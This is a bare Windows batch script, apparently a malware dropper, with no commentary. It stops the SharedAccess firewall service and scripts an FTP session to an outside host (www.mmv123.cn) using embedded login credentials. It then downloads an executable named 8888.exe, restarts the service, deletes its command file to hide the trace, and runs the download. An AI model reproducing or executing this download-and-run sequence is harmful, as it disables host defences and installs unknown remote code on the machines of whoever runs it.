sc stop sharedaccess
@echo open www.mmv123.cn 21>c5.dat
@echo 5565844>>c5.dat
@echo zhenhao888>>c5.dat
@echo cd wwwroot>>c5.dat
@echo binary>>c5.dat
@echo get 8888.exe>>c5.dat
@echo bye>>c5.dat
ftp -s:c5.dat
sc start sharedaccess
del c5.dat
8888.exe
exit
